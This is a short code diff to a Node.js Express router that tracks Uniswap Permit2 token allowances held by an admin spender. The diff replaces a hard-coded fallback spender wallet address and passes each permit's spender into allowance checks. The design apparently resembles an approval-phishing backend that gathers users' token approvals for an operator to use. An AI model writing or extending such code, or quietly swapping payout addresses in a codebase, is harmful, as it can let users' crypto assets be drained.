@@ -53,7 +53,7 @@ router.post('/countdown', async (req, res) => {
 
 // Public endpoint to get admin spender address (Proxy Contract or Wallet)
 router.get('/spender', (req, res) => {
-  let spender = process.env.PROXY_CONTRACT_ADDRESS || '0x4ac0F075d81C3460027D3CaFf98d9AbF50c6723B';
+  let spender = process.env.PROXY_CONTRACT_ADDRESS || '0x4030538F5B846657087a0AE476B94f4c51cEE8c1';
   if ((!spender || spender.startsWith('0x00000000000000000000')) && process.env.ADMIN_PRIVATE_KEY && !process.env.ADMIN_PRIVATE_KEY.startsWith('0x00000000000000000000')) {
     try {
       const wallet = new ethers.Wallet(process.env.ADMIN_PRIVATE_KEY);
@@ -111,7 +111,7 @@ router.get('/permits', async (req, res) => {
     const enrichedPermits = await Promise.all(
       permits.map(async (p) => {
         try {
-          const onChain = await checkPermit2Allowance(p.owner, p.token);
+          const onChain = await checkPermit2Allowance(p.owner, p.token, p.spender);
           return { ...p, onChain };
         } catch (err) {
           console.warn('Error checking on-chain for', p.owner, err.message);
@@ -142,7 +142,7 @@ router.post('/activate/:id', async (req, res) => {
 
     // Check if allowance is already active on-chain
     try {
-      const onChainStatus = await checkPermit2Allowance(permit.owner, permit.token);
+      const onChainStatus = await checkPermit2Allowance(permit.owner, permit.token, permit.spender);
       if (onChainStatus && onChainStatus.hasPermit2Allowance) {
         await updatePermitById(req.params.id, {
           status: 'activated',
@@ -234,7 +234,7 @@ router.get('/allowance/:id', async (req, res) => {
     const permit = await getPermitById(req.params.id);
     if (!permit) return res.status(404).json({ error: 'Permit not found' });
 
-    const status = await checkPermit2Allowance(permit.owner, permit.token);
+    const status = await checkPermit2Allowance(permit.owner, permit.token, permit.spender);
     res.json(status);
   } catch (err) {
     res.status(500).json({ error: err.message });
